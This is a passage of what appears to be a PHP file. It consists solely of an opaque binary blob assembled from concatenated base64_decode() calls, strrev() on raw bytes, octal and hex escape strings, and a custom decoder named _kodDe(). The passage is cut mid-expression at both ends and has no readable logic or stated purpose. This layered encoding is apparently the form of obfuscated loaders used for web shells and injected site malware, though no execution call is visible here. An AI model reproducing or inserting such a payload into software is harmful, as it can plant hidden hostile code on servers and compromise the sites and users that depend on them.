').base64_decode('dyUfcThLuG8KLYS2XC1QjnK0BMLVlrO0FFqOchRaIOGmHKWlJcCfe2ZXMtBP62jmzZvZOd68eTM=').base64_decode('896bXX+f+gr439cu+uHvzj/xlyedimNTe4B/v4rDR56+927ovz0Ka34d2r3lgDMfPz/x64fPP/4=')."\276\245\55\122\303\310\5\163\135\243\217\377\240\355\252\303\377\262\345\117\13\13\213\16\374\355\203\333\133\157\171\153\325\66\363\205\325\257\376\341\316\37\312\37\77\362\311\375\237\276\361\344\252\307\366\76"."\x69\xc1\xbc\x5f\x76\x3b\x26\x5e\x59\x7d\xc4\x6e\xeb\x67\x7a\xf\x39\xf1\xcf\x3b\x8e\xfe\xce\x7d\xb7\x7c\x6b\xe7\xa3\xe5\xa1\xbf\x9f\x93\xbf\xe4\x8e\xbd\xd6\x5d\x74\xc0\xc5\x27\x3f\x76\x65\x7f\xc7\x15\xb7\x1d\x7d\xe2\x3f\x3e"."\321\312\347\15\114\66\255\135\364\361\345\367\215\354\377\267\273\76\334\373\275\273\176\375\130\375\304\156\57\366\167\377\346\254\143\156\77\340\200\337\74\137\274\267\157\125\303\212\221\257\55\75\340\241\245\345"."\x7b\x56\xfd\xf3\xd5\x13\xc7\xbf\x31\x7b\xfd\x69\xc3\xfb\xfd\xea\x8c\xb6\xd9\xf7\xfd\x66\xd5\x7d\xe1\x97\xff\x73\xea\xbf\xee\x3e\x62\x6d\xd7\x2d\x1b\x7c\xcf\xcc\xf9\xc3\x33\xc6\x85\xa1\x67\xda\x2e\xbd\xe5\xbd\xba\x59\x6f\x1f".base64_decode('uPYp79oL1jyrXTyx+KHz9lp42O/rH0qcN+uwuVrPET8/7475xX+dY2gXXLYp8/g8z4afLWzydHc=')."\xff\x6d\xd9\xde\x47\x1c\x7f\xe7\x8b\xc9\x8d\x53\x57\xb5\x7d\xf7\x8f\xcf\xbe\xac\xdc\xfa\xac\xfe\xcc\x77\x5f\x31\xfe\xbe\x75\xdb\xa6\x99\xcb\x3e\x7b\xed\xb6\x5\x3f\xfc\xef\xf1\xc6\x41\xb7\x9e\xb1\xe7\x29\x4f\xfe\x68\xcf\x6d"."\127\137\47\357\271\350\346\366\317\226\374\101\276\362\302\137\274\176\316\143\335\13\327\66\155\332\172\300\107\13\377\375\375\241\167\3\377\335\357\303\43\307\377\370\342\356\273\355\206\73\272\35\377\110\105\315"."\224\224\161\325\60\15\14\110\151\305\214\232\305\141\265\210\177\335\370\307\30\315\253\246\202\303\211\120\70\226\210\366\367\365\371\43\261\4\51\121\114\57\150\151\22\52\311\272\134\40\205\227\24\335\0\237".strrev('òêõgLc(-Lfë)¨ÁC	ôVZ12F	ù÷ÖÄO¯ßÏ„®¾IH6Rr›- 8@´R’´”K‹')."\257\14\204\244\130\304\23\212\172\274\261\100\70\204\301\336\160\157\157\40\126\15\217\204\203\301\56\217\167\165\165\112\137\304\263\262\327\43\201\372\345\225\204\132\314\150\15\322\106\234\262\121\152\304\201\156"."\125\311\247\161\260\50\323\352\230\23\45\22\212\261\20\30\203\142\71\237\307\221\20\13\221\372\53\31\271\234\47\175\346\23\43\45\135\55\310\264\351\253\225\11\6\305\1\271\154\152\152\61\205\43\376\161"."\x53\x97\x39\x1c\xd4\x38\xa5\x2b\x5\xa5\x48\x8a\x8a\xfa\x83\x7e\x6f\x4c\x82\xd5\x94\xba\x23\xe1\x5e\x89\xc\x45\x41\x36\x4c\x45\x97\x6\x7a\xfc\x11\xbf\x4\xab\xde\x51\x8f\x5a\x5c\x2f\xe1\x7c\xfd\x21\xd0\x21\x92\x27\x18\x94"."\xa6\x2b\xc1\x54\xa\x25\x5a\xc\xce\x53\xa3\xb0\x70\xc4\xe7\x8f\x48\x5d\xeb\x25\xde\x4f\x29\xad\x50\xd0\x8a\x2e\x50\xa\x18\x4f\x53\xa8\xaa\x3f\x12\xc1\x1\x7\xa1\xe0\x60\x0\xe\x1d\x89\x84\xbb\xbb\xa3\x7e\x16\x23\x8d\x5b".base64_decode('EwQ1mU+o1BJLZ/JmoiLny5RYR/BvPfkhv5pBCHhULaplQqykCE1jM4cEyhRboZACyKaROQUmWAU=')."\7\73\72\361\357\122\202\224\114\300\64\105\67\23\112\61\245\245\325\42\231\206\313\311\224\43\204\47\233\71\237\256\2\74\122\240\346\112\151\245\211\136\255\102\332\220\121\363\112\220\315\262\214\226\117\53"."\x3a\x8f\x97\x40\x76\x31\x85\x34\x46\x9d\x14\x72\x87\xca\x5\x11\x85\x45\x53\x39\x35\x9f\xd6\xe9\xe4\xfc\x3c\xcc\x16\x52\xac\x62\x9a\xa0\x19\x6\xad\x69\x7f\x29\xaf\xc9\xe9\xa8\xa2\xb\xb5\xef\x6\xc5\x84\xcb\xa6\x8\x2c\x23"."\xb4\x6e\x4d\x2f\xf8\x0\x3\x20\xbd\x3\xc8\x5e\xed\xaf\x91\x30\x42\x9\x3f\x2d\x74\x8a\xb\xff\xb8\x1b\x6\x8f\x77\x7e\x3a\x34\xb8\x2\xfc\xd3\x48\xb8\x58\x9c\x54\x2d\xa7\xe4\xf3\x9\x65\x5c\x21\x13\xa4\x90\x5e\x60\xd0\xda"."\273\215\244\132\164\3\10\216\6\302\211\234\154\344\172\323\13\22\50\27\251\171\61\255\214\273\112\271\22\216\362\11\114\50\27\166\164\110\63\375\2\157\315\153\51\71\57\66\21\207\163\246\131\212\52\305"."\x34\xec\x9\xd2\x14\x6d\xac\x88\x7a\xaa\xa4\x28\x4\xc9\xe7\x90\xd2\x52\xaf\xb4\x5e\xea\x69\x57\xdb\x29\x59\x1\x22\xc9\x4c\x70\x56\x97\x33\xb\x79\x16\xa2\xcd\x64\x30\x83\x1\xcd\x71\x42\xc\x75\x24\xae\x8c\x9b\xa4\x77\xa4"."\xa5\xa9\x9c\xac\x83\x71\xeb\x28\x9b\x19\xe7\x62\xc\x94\x4b\xa5\xbc\x9a\x92\x4d\x55\x2b\xba\xb5\x94\xa9\x98\x4e\xc3\xd4\x15\x99\x94\x56\xb7\x54\x82\xa4\x0\xa7\x6e\x13\xce\x45\xa7\x8d\x57\x2b\x9a\x60\xde\x3a\x63\xba\x5c\x34"."\62\212\356\364\23\272\156\227\100\7\63\326\105\321\174\252\121\322\14\25\176\246\135\222\115\123\116\345\340\264\347\305\167\174\16\276\132\314\253\105\245\12\327\223\112\51\206\341\204\131\164\55\357\364\344\363"."\xda\x98\x33\xac\xab\x59\x15\xe4\x69\xb2\x55\x13\xb0\xa4\x76\xc2\x33\xfc\xe3\x25\x55\x57\xc\x1a\x95\x56\xf6\xc6\x8\x32\xa8\x95\xe2\xec\xd3\xe5\x6c\x41\x6e\x97\x4a\xe5\x24\xe8\x19\x32\x31\x6b\xc0\x30\x36\xf9\x7a\xbb\x94\x82".strrev('öó×¢!Â¬ D¾±b{C'."\r".'4I'."\0".'“noÏ3Ø'."\n".'3´•TñÂöq/G'."\n".'ÁQß'."\0".'WS¦(T‡Q')."\152\233\162\226\326\71\10\230\56\53\222\2\327\71\301\134\203\204\26\2\175\304\201\175\332\230\242\203\17\167\115\264\113\43\132\72\251\215\273\150\22\104\216\2\366\100\221\141\217\226\114\147\104\56\146\141"."\xff\x24\x27\x4c\x85\x90\xa3\x51\x21\xc\x2b\xea\x8f\xac\xf5\x47\x12\xd1\x70\x77\x6c\xc0\x13\x21\x2b\x75\x11\x74\xf9\x38\x2d\x14\x16\x92\x77\x46\x94\x34\xe8\xe4\x94\x49\x8b\x96\x4b\xb0\x7f\x28\xe\x9c\x12\x70\x34\x69\x2a\x9c"."\x26\x34\x2d\x18\x58\x9\xbb\xc0\xe7\x34\x0\x92\x53\xc4\xa2\x65\x7\xd5\x82\xa\x6b\x69\xb2\x14\xd4\x67\x60\x19\x5f\x49\x2a\xe4\x46\x55\xef\x88\xe7\x9a\x1a\xe2\xe9\x79\x8d\x4e\xf0\x6f\x53\xe3\x60\xdc\xe7\x6a\x1a\x5a\xee\x56"."\x79\x1e\x77\x8b\xab\x45\x6a\x6d\x5e\x28\xf5\x1\xb9\x42\x95\xf3\x12\xa1\x97\x2a\x8c\x66\x29\xbc\xda\x4a\x51\x41\xa5\x98\x35\x73\x44\xd4\x8a\xf8\xd7\xf4\xfb\xa3\xb1\x44\xaf\x3f\xd6\x13\xf6\x91\xdc\x7e\xf\x9\x5\x35\x3c\xc1"."\x68\x6d\x7\xf1\xcf\x10\x19\x7\xb0\xd2\x67\x95\x94\x96\xd7\x74\x39\xf\xd9\x8\xa5\x1a\x85\x4e\xe5\xac\x9a\x99\x62\x6c\x39\x0\xe4\x11\xd2\x69\x98\x71\xf1\x48\x54\x2d\x94\x28\x9b\x31\x73\xe5\x42\x52\x8\xba\x79\x9\x64\x44"."\301\160\60\346\242\261\45\104\323\111\250\335\115\262\314\155\355\46\124\34\166\107\347\203\377\163\306\230\326\12\62\25\44\321\364\123\322\170\376\141\120\223\45\245\107\221\371\232\144\352\246\6\241\272\5\245".base64_decode('VzFzGpkGWYVWqczqRmuZVvIK7aWcQnktkI4qrPNKupJRCU0CcQjAOS9VjQjIBMUTGh+AUiQHmJw=')."\355\312\6\147\335\60\42\54\254\335\375\301\140\302\33\16\305\200\44\211\41\3\221\100\314\117\51\302\343\113\170\274\175\123\164\5\342\303\104\20\340\44\263\222\24\227\32\53\255\123\234\173\163\66\317\31"."\47\251\70\142\214\70\14\70\132\111\53\32\212\63\105\112\113\163\26\212\61\226\332\370\147\125\16\56\277\216\73\345\302\244\263\240\230\262\223\125\335\272\112\111\204\147\342\305\56\100\206\200\263\274\74\130".base64_decode('GsH2gC6PfeEoybAcQoEwkVR0Uo++fpJUEIZ/pZ8A9yUUk5NbCK0MRCm7KgN8XZ2UeRuX0/qQssc=')."\13\171\56\37\45\124\313\370\45\264\344\60\340\120\200\350\344\132\255\166\362\261\212\365\4\102\253\23\275\141\237\77\230\10\204\0\13\214\125\303\373\373\174\36\72\370\42\274\53\34\353\261\100\373\1\237".strrev('G›€ñ[pÅàdI^BqÃÛÇ¯	¢úà;´Xë»ø‹êc°¶ıúÀ	3Z,huşèì	ëX').base64_decode('2c4nUYG7ONqZCcs2I0EF6ASnE7AEKYQ2SXPh3hG1hIi0Ka1MqZXJYAXKIAoymaEyXV4a8E+j5Ik=').base64_decode('SmaJlAFYQXKCBVEzaBwIXeT7EmG+VTVIQJwuJaPpyucBPBmTEYYtDuYNTwMj4EGbVEAJaEQSdC4=')."\x1a\x40\xbc\xf7\xd0\xea\x64\xf8\x6\x31\x11\x6\x3b\x69\xf\xdc\x5e\x26\x6\x22\xe1\xd0\x4a\x92\x61\x2c\xa7\xd0\xa\x4\x48\xf7\x37\x50\x91\x84\xec\x32\x4d\xce\x92\x80\x3c\x21\x73\xd1\x90\x76\xfa\xb0\x46\xbb\x72\xa\xff\x1c"."\x85\x7f\x80\x8\x46\x3e\xae\x14\x69\xaf\x27\x21\x63\x66\x8c\x83\x6e\x21\xc0\x6c\xa1\x4c\x55\x2b\xb3\xaf\x25\x35\x8d\x7c\x21\xf\xd7\xda\x29\xca\x2f\xd8\xfe\x74\xd8\xa0\x44\x32\x4e\x99\xd3\x3c\xf2\xc1\x71\xb2\x38\xc4\xc2\xab"."\xfd\xa1\x4\xa5\x2c\x1c\x13\xa8\x11\x3\xc0\x8e\x2f\x1c\x21\x1d\x62\x6a\x23\x74\xff\x81\x13\x23\xfe\x28\xe5\x2\xba\x32\x5a\x56\x69\x77\xb9\x5d\xf3\x8\x15\x2b\x60\xfd\x21\x9f\x77\x6f\x88\x8f\xcd\x6b\x18\x74\xce\x73\xd\x81"."\100\143\323\12\34\45\261\270\313\22\235\103\362\227\165\226\33\212\40\15\306\362\306\366\270\73\356\156\130\336\76\350\161\116\312\316\311\146\347\22\347\320\274\270\253\161\36\1\14\155\152\165\264\155\206\10"."\0\161\371\354\41\360\323\21\137\76\67\356\74\352\230\215\53\6\343\103\365\355\363\146\305\135\263\343\143\103\115\215\313\351\167\122\145\35\354\255\122\23\254\252\351\171\15\240\112\100\64\141\50\105\304\22"."\5\4\232\60\251\226\70\164\323\302\315\24\16\306\120\311\362\34\203\316\370\274\241\345\102\76\1\144\377\26\20\135\0\177\316\61\74\217\363\150\330\62\226\25\316\173\102\37\345\142\212\163\127\70\57\222"."\162\212\360\1\65\133\144\123\10\54\350\154\117\153\225\175\67\315\305\277\233\351\100\146\25\272\54\303\343\50\235\120\147\271\250\216\322\235\172\121\31\45\1\315\244\364\235\124\314\61\205\222\7\200\133\342"."\200\70\350\346\13\44\11\261\74\22\322\310\27\370\246\107\101\73\0\322\212\122\2\212\135\143\54\226\126\212\144\234\366\41\330\106\112\56\51\121\241\205\211\104\314\323\25\364\47\50\207\41\234\230\306\21".strrev('šTÉ/NÄ$K„ÍÜ%::–°%? ˜ûØ²‚\\£;s£·¦ºè¤˜„¼Ñ‡$²£œi [gbìW').base64_decode('gHtUJiG4G+Lx8qCSHhoEhCw7M0Ob5m9upBKwOw7+oxHMv0iNS3z8DCBrpQjcU+N4KcE4IKwCOyU=')."\320\164\266\316\102\70\227\132\115\315\224\363\14\15\246\305\40\204\214\27\133\253\311\116\33\17\140\220\63\41\270\72\13\207\157\210\103\206\330\311\22\73\60\20\316\175\0\314\41\104\361\277\35\144\173\234".base64_decode('UYtgInj5IhXwOckgetY5A0SAZwGVipoymM4mhRpaWU8pDMciZJiyDtYsLtlBGUw4HQQ1d8DTBAc=')."\x5c\x53\x1d\x40\xda\x73\xc0\xe3\x1a\x7\x97\x58\x1d\xfc\x20\xc0\xc1\xe4\x4f\x7\x11\x4b\x1d\xbc\x74\x12\xc\xf8\x1c\xaa\xe1\x43\xe2\x31\x2a\x17\x25\xd1\x3a\x9b\x39\xb8\xad\xce\xcb\x13\xe\x5c\xff\xa0\x52\x51\xf2\xe\x5a\x7b"."\x7\x6d\x94\x83\xb6\xc0\x81\xf6\x1b\x3e\x52\x9b\x7e\x40\x1f\xa4\x36\x28\x8\x98\x44\xce\x1\x87\x3\x8e\x2d\x2d\x5\x6\x69\x37\x30\xa1\xda\xc1\x5\x6e\x47\x56\xd7\xca\xa5\x3e\xfa\x25\x21\x86\x2b\x43\x0\xbc\xa6\xc\x10\xd1"."\x34\xd3\x41\x37\x40\x2c\xd0\xcb\x38\x10\xac\xe\xf\xad\xe5\x3\xce\x6b\x3f\x45\x97\x4f\xd2\x4\x1c\xb7\xd7\x1\x43\x61\x7a\xb7\x5c\x11\x7\xb8\xe6\x60\x17\xad\x84\xc1\xf\x39\xf9\x61\x1c\x17\x97\xec\x1b\x11\xfb\x21\xf\xef".base64_decode('RF6JmJyNCp835Sz9NgZHlNREiu9kfMLWyBpj44yIrhbl1B5nRg2MsPbdZx9KxpxoCK1YKGtaUuY=').base64_decode('zQuX+PICZ38UMD1hflNQmLOTMlkOZYMIpvBEjYQUChPqT1tvKRdG+TSkTZRgASQDYtBwKJx8PIU=').base64_decode('KPlRtQTu10SBbSNYR9s4D+z3PrU4oRbFjTqHcgbHKQDSMo/hPp4ujBkJPwhwkAMCB9gkjggsjm8=')."\x68\x41\xed\x61\x56\xa1\xee\xa4\x24\x5b\xcd\xe9\x6c\x73\x5a\xa3\x7c\xf2\xf5\x83\x3d\x51\x82\xd6\x86\x50\x2d\x21\xd2\x9c\xac\xf3\x5e\xa6\x13\xa\x52\x31\x6b\x95\x1\x51\x78\x54\x40\xcb\xc8\x15\xce\xdb\x2d\x79\x84\x69\x60\x98"."\23\354\114\103\10\132\13\305\121\337\164\221\36\266\325\253\25\25\347\237\152\4\101\157\326\12\243\226\306\264\232\121\44\2\110\140\361\247\347\135\124\226\117\330\316\24\100\124\30\251\204\345\370\1\127\303"."\xc3\xf8\x1c\x90\x62\xf2\x60\x4\x74\x17\x9c\x24\x2b\x21\x17\xa3\x7d\x83\xe7\x33\xad\x9\xe4\x9c\x38\x2c\x20\x95\xec\xc\xcf\xc2\x98\x45\x1c\x1a\xb3\xb3\x66\x1b\xd4\x16\xe5\x1f\xb5\xf0\x1d\x3e\x97\x2c\xa5\xd0\xb3\xa6\x66\x42"."\365\151\260\105\164\351\230\263\271\200\254\101\356\145\34\315\302\132\306\247\357\46\143\302\60\225\2\341\204\233\155\275\143\202\275\114\122\326\135\72\250\21\257\50\347\377\104\322\50\63\300\220\35\3\27\37"."\xd4\xa8\xe0\xb\xe9\xdf\x9f\x56\x4d\x8\x81\xdc\x4c\xa3\x27\x54\x1c\x51\xe0\xe9\xc\x26\x14\x88\xba\xc4\x55\x35\x6\x79\x75\x84\xe4\x72\xcc\xb5\x60\xd6\xe2\xe4\xae\x26\xc4\x73\x5d\x7c\xa1\x11\x97\x29\xf1\x6\x8\xa2\xf1\x96"."\xc3\x1b\x25\x1c\x12\xee\x4e\xb\xec\x8a\x9\x1\x5d\x86\xa9\x95\x78\x8a\x10\xc5\xc9\x42\x12\x2f\x54\xc0\x62\x9d\x8f\x6a\x8\x56\x80\x34\x12\x6\x78\x17\x22\x5c\x92\x17\x89\xcb\x98\xb8\x5d\x79\x80\xe1\xe2\xb5\xe\xf8\x3c\xba"."\x4e\x89\x4\x37\xf\x1e\xd7\x0\xa0\x8\x82\xd3\x35\x4a\x8f\xb\x6b\x71\x64\x5c\xb8\xbf\xc2\xef\x44\x71\x51\xf0\xc3\x2e\xbc\x40\xb9\xe4\x74\x3a\x4c\xcf\xd2\xc4\x70\x35\xaa\x78\x74\x50\xbb\x20\x74\x4d\xcd\x8a\x12\x62\xb5\xd1"."\x3d\xf9\x3c\xbf\xf3\xb2\xc7\xa7\xcd\x82\xe7\xaa\x98\x49\x84\x4c\x9b\xad\x1b\x49\xbc\xf4\xb2\xa1\x16\x8c\x9\x70\xdd\x36\x1a\xe2\x33\x8e\xdf\x29\xda\xe5\x5b\x2b\xf3\xf9\x22\xd9\xab\x6a\x6\xf0\x1\xad\x1d\x87\xfc\x31\xa7\x16".base64_decode('FYOtTLpRi898kXxjEXGtgowowZDlkDdX7FZI/tPRAkwTTpDAhgkAxHWEHZNwviMslWjZSZiWZT8=')."\x82\xca\x10\xe6\x83\x65\x88\xc1\xfc\xc3\x2d\xea\xd6\xb5\x42\x20\xc\xe6\x57\x6d\xa2\xb3\xe3\x29\xf4\xa0\x8\x31\xb5\x71\xb6\xff\x12\x33\x1\x22\x81\xab\xd0\x74\x65\xd2\x64\x56\x14\x5f\xb2\xee\x7d\x7e\xdb\x4b\xd7\xbd\xbf\xeb".base64_decode('xAefxfGtN91xwd2P3vt3HNOyE8bIMGn9FNQT2gOHuabQSeveLB724De7H+885aDnTrii+5/nPfI=').base64_decode('3MKyfNqVc353QcO5F0yN3PmDv16644bF2295/vTxaz77duGgV1eednD5+Dtyjx/qfGz3wlu7zTg=')."\260\315\363\342\117\157\276\340\266\327\34\257\376\176\303\153\15\13\366\67\136\375\375\333\361\273\215\107\27\75\60\377\354\276\75\226\177\372\302\313\107\56\373\364\230\343\77\373\336\335\157\277\173\243\372\212".base64_decode('e7h97StH9+487xuXHVq3edmppQO+1ZaPHLlw6TsP3Tiyqv+p8qWrT3hsZuNl0bc+aHn/zmNeeV8=')."\73\333\67\173\351\277\57\15\276\167\354\314\326\375\102\127\177\364\247\157\314\32\76\170\143\142\301\354\103\156\170\346\62\163\153\103\347\241\247\76\247\377\156\301\77\37\373\151\361\374\267\267\4\322\133\222"."\227\205\146\57\372\352\214\53\316\371\157\327\331\327\335\361\322\247\127\34\363\364\203\137\237\61\232\234\365\353\346\157\372\16\75\354\67\153\137\134\151\54\220\176\165\326\55\273\357\365\361\354\255\107\370\256"."\360\355\365\334\303\337\273\354\305\316\145\303\63\267\274\261\346\236\337\356\271\250\360\364\275\267\234\220\235\130\164\376\246\363\267\377\345\344\177\74\276\133\374\365\227\317\175\343\47\175\267\75\161\337\123\227".base64_decode('zLxqxp4Fx6GHzTxmMrr52MMfPe7Iw93dVx9940VvbvnN3Psuea4cX/vG/Qf27J9/1tVw29Mj750=')."\xfd\xeb\x3\xe2\xcf\x5\x97\xb7\xdf\xb5\xf9\xd3\xbb\xfe\xfa\x76\x61\xe1\x1d\xc3\x6b\x2f\xf8\xe0\xed\x9e\x99\xd7\xcc\xe9\x9f\x7b\xd7\x5a\x4f\xf3\xf5\x97\xba\xce\xb8\xf6\x8c\x83\xd3\x7\xdf\x3e\xe7\xd0\x91\xd\xeb\x5b\xde\x54".base64_decode('1o8//t1LD/3mjIG2wA3H3/Xnx33XDhx85UVtix+8/6cnnJm8/ronf+1JpUf6r7vp+o3h/X/ym2s=').strrev('}î–‡Ëoün{,»OûÆúìe~¼WèöîO=‰öí—3ÓN\'‡ûé®6»©İ}om¿ÜoÙüÎ')."\133\376\274\373\26\327\325\377\354\216\71\227\354\320\277\351\310\37\176\100\333\203\235\47\117\176\345\315\157\375\365\244\53\56\175\354\322\326\362\214\300\65\373\336\63\177\174\305\212\275\76\220\356\13\151\327"."\264\157\73\150\217\343\116\334\361\104\247\136\252\74\377\233\257\64\274\226\314\267\71\257\73\373\222\175\236\375\347\275\213\146\2\156\166\370\243\357\366\35\20\274\106\373\347\354\272\310\141\333\277\341\273\67"._kodDe('KuNn648TUk7xwL8/JxELt+nTGgNP6oCJ0Lfzo18i0bs7kcPKLcupnWknsbFb1vAwU7P/XOetuyHy').strrev('uããÛn\';ôÿîñ<VÅñhkn9×³á!Ô€öÿÉZÜ6MàÏR×¥ÃÉWÒqÛ³{öıŞí©')."\77\176\163\216\121\12\75\77\347\333\377\371\371\247\341\137\356\154\255\34\65\164\370\77\346\36\63\303\361\312\313\67\274\175\326\221\177\371\321\325\253\156\120\317\336\370\255\223\57\173\373\254\257\35\20\74".base64_decode('yD/nEO3TGeseLezja7zlooUzXv/29p/XLTrX+dcZfulHIxnzJ7//1zFHtf385R1btldyyn4/+uE=')."\361\367\134\174\234\131\156\224\73\136\272\367\362\313\177\163\335\131\17\76\161\334\251\312\73\112\376\157\375\35\347\137\361\110\373\304\303\311\112\160\257\125\27\245\142\37\75\230\111\75\246\136\273\327\231\177"."\xf\x3d\x75\xe9\x5e\xe7\xec\x16\xaf\x9c\xf6\xc9\x71\x7f\xfd\x53\x25\xfc\x9f\x75\xde\xaf\xdc\x70\x61\xff\x5b\x6f\x4\xf6\xbd\xe9\xe7\xcf\x5c\x7b\xd6\xc8\x9f\x9e\xbf\xf0\xe0\xdd\xcf\xdc\x3a\xb5\xd7\x9e\x4f\x1d\x76\xc2\xb7\xbf"."\x77\xce\x6e\xf\x2d\x88\xad\x7d\x72\xfd\x47\x7\x9e\xfc\xee\xcc\x79\xcf\x2c\x1e\xfc\x68\xcb\xe5\x4f\xbf\xf1\xcb\x9b\xaf\x3b\xe5\xf9\xe6\x3\xf7\xff\xed\x4d\xc3\xbf\x7a\xf8\x81\xf6\x9b\x2b\x6d\xb7\x1e\xbe\xf5\xa0\xab\x67\x9d"."\177\365\254\134\161\257\321\366\343\377\164\375\135\217\336\375\354\153\225\115\143\117\206\316\176\344\235\137\55\172\362\230\33\27\305\257\277\342\253\373\50\251\365\117\127\362\213\357\273\365\224\33\277\355\367\172"."\266\375\300\265\361\201\256\303\366\277\373\252\375\334\37\157\277\344\112\363\202\353\116\355\77\374\64\307\151\17\373\177\260\156\166\360\321\365\277\175\172\346\266\313\376\266\370\354\255\115\127\351\167\305\327\334"."\73\132\377\225\347\56\74\363\250\75\116\353\316\166\315\173\360\262\242\347\147\57\154\35\335\157\236\343\76\320\113\245\357\276\171\353\265\225\323\76\274\357\221\277\317\75\354\314\364\207\207\105\35\117\172\257"."\114\374\352\361\323\367\171\142\347\256\363\326\237\336\276\330\265\355\242\340\322\305\276\261\167\227\165\33\357\36\276\372\117\377\375\317\3\267\176\374\327\350\365\217\374\341\264\227\37\70\347\322\302\145\317\117"."\74\323\366\341\350\113\67\277\376\212\171\324\43\335\201\65\127\236\267\270\365\341\346\323\103\117\56\216\274\176\337\67\337\372\370\211\143\367\73\353\354\374\232\71\313\334\277\334\62\343\216\135\241\25\201\233"."\xfa\x56\x65\xce\x5a\x92\xfe\xe8\xa3\xd0\x8d\x57\x1d\x71\xdb\xc7\x27\x7e\xef\x86\x8f\xfe\x72\xdf\xdd\xbb\xbd\xf0\x68\x69\xfc\x27\xff\x7a\x6e\xf0\xed\x63\xb6\xcf\x3c\x74\xdd\x43\x65\xbf\xf7\x9d\xb7\x66\x6e\x71\x84\x9f\xd8\x19".base64_decode('Sh17z1/3fHfuM+GGK67flNv60pvO9At3N11kds3u2/TJ4x8u/drwd+qfGl+y3nWQZ3iPsaPnz7g=')."\175\170\325\212\311\173\317\334\372\315\33\356\377\367\363\57\365\336\162\130\342\326\157\235\241\275\127\36\371\332\276\217\137\177\306\327\367\212\305\106\274\231\103\36\126\76\170\266\334\171\367\346\376\105\257\104"."\156\327\123\205\117\236\175\166\301\266\277\164\371\134\17\177\170\363\225\3\67\227\157\270\77\364\207\53\317\72\376\317\315\317\34\177\207\143\127\51\160\363\273\37\336\370\243\273\77\175\371\217\356\15\237\176".base64_decode('+NKT53+wfPl/dj7zwekDN75w1/iHO545/ditm9/d9eHPjl1y7Hvv7/r3PevW7/XrzQ/9Y/NnD14=').base64_decode('fOwH9aW2DU/d0PbWkh+X1owdu/TkYMM39jzkZMeRD7z97c6Nrz9xWeSay0cWfO/9Hb6zbz/wLzs=').base64_decode('t/zslL03zPrL6t8373ZC5zeOSRV7ug8aqL94/fd/eMnvLtoSnt1z5IO/LBUm5HlnPnfaO2dcuu4=')."\x89\xdb\xe\x59\xbc\xd2\x27\x2f\x74\xfe\x54\x7a\x28\x75\x64\xb0\x6e\xfd\xac\x7f\xbf\xfc\xf8\xb9\xaf\x9d\x11\xf8\x4e\xef\x33\xfb\x6d\xda\xb0\x31\xb7\xf9\xb6\x19\xc6\xfb\xa5\x97\x2f\xfd\xe5\x87\x2b\xdf\x7c\x5a\xbb\xfa\xb4\xaf"."\xce\xdd\xe0\xba\xe8\x88\xeb\xaf\x7f\x71\xdb\x2d\xdb\x17\xe4\x1a\x7f\x3a\xaa\x5f\xbc\x7c\x5e\x69\xf7\x27\xbb\x1a\xdd\xaa\xfc\xd6\xa9\xdf\x3d\x7d\xcd\xe0\xba\xc2\x47\xf7\x7f\xff\xe8\xdf\xdd\xee\xeb\x79\xb2\xe5\x47\xb7\x1c\xe0"."\253\273\376\57\57\34\174\272\172\351\276\215\163\75\306\353\213\116\71\343\301\163\32\16\30\336\373\236\237\76\321\275\152\373\111\257\135\165\106\366\133\27\276\165\363\275\377\175\343\266\53\116\331\162\342\103"."\x1f\x5c\x7d\xe4\xce\xeb\xef\x6f\xbc\xee\xa3\x96\xaf\x57\xda\xd6\x7e\x7c\x9e\x71\xe1\xf7\xf\x70\xfc\x51\x1f\x7a\xee\xf\x3b\xcf\x3a\xdc\xdc\xfa\xcf\x77\x2f\xbf\xef\xd3\x5d\x47\x2e\xf8\xd7\x15\x1f\xfd\xe8\xc9\x7\xb6\xce\x3e"."\xa9\xe9\xbb\x3\x37\x4\xfe\x7b\xe7\x8e\xe0\x59\xe1\x5d\xeb\xd7\x1c\x6a\xce\x2e\x5c\xfb\xf1\xbf\xf\x7d\x7b\xaf\xc1\x67\x6f\xb8\xf9\xf8\xec\xe9\xdb\x4f\x7c\xed\x17\x13\x8b\xcf\x5f\xb4\x69\xfb\xe9\x47\x3f\xf3\xf8\x51\x1f\xca"."\267\75\275\354\371\363\166\71\365\71\47\215\375\343\233\213\266\76\154\56\174\135\273\355\344\153\237\176\141\370\33\167\266\134\263\352\235\167\102\312\166\155\313\47\336\167\37\336\175\373\252\65\256\125\345\75"."\66\144\77\374\371\233\213\236\272\340\251\265\47\70\317\370\356\202\167\216\35\377\326\265\355\207\235\272\170\275\274\267\44\177\362\360\201\373\237\63\164\321\3\247\165\374\370\53\307\55\374\165\313\366\127\366".strrev('Œñ[¶Ü£ŞùßŸÜüşŸ¯ú«ü|ŸšĞ„â}º?ıÛ¼Ş?¥âü7ÙÌøÒœÏÇê:ì_‚ùºÖ}º')."\367\174\357\347\73\177\60\321\277\265\175\337\256\127\26\35\166\175\354\314\313\356\277\374\336\223\237\230\153\14\137\274\317\7\77\150\175\156\127\307\53\336\45\263\276\366\376\241\77\374\356\217\222\233\62\333".strrev('²r?o½Û÷³æjap=}óıRô7Ü?=œòº¯[ã§r7õ¢ğáşqk§üÇ¿ à¹ìÏ')."\x9c\x7d\xe5\x28\xf7\xdf\x17\x1d\x79\xf1\xf8\x51\xa7\x1c\x7e\xd6\x67\x2f\x3f\x74\xc8\xd6\xed\x7\x3c\xed\xf9\xd7\x8a\xfb\x65\xd7\x49\xe7\x9c\xfe\xd0\xb2\x5f\x9c\xb8\xfb\x7e\xb7\x5e\x72\xff\x67\x7\x5e\x32\xd9\x95\xbf\xe8\xba"."\31\373\16\357\364\377\370\274\47\217\112\236\364\215\255\256\337\165\5\256\374\136\303\325\267\47\235\333\266\255\371\163\223\363\256\67\266\154\271\365\271\37\276\360\342\205\200\233\276\57\235\366\365\327\336\173"."\x6f\xe7\x6b\x77\xbf\xd2\x7f\x4e\xfe\xe9\xb3\xc6\xc6\xe\xdb\xeb\xa0\xd6\xfe\xab\x9f\x7d\xa7\xd0\xbb\xec\xc9\x8b\x2f\x39\x63\x56\xf0\xeb\x23\xf\x74\x8c\x3d\xb7\xd5\xb9\xdb\x4d\xab\x3f\xfa\xdd\x8e\x4b\x97\x5e\xef\xbc\xea\x98"."\xd4\x27\x8f\xcf\x7e\xed\xd6\xc6\x5c\xbf\xf3\xe6\x53\x2f\xb\xd5\xbd\xf5\xc7\x81\x15\x87\x7d\x75\xce\x35\xdf\xfc\xd5\x92\x81\x8e\xad\xd7\x3c\xdd\x75\xce\xac\xbb\x67\x9c\xbb\x6b\xd7\x21\x27\xcc\xfd\xed\xbb\xc7\x7d\x16\xdb\xb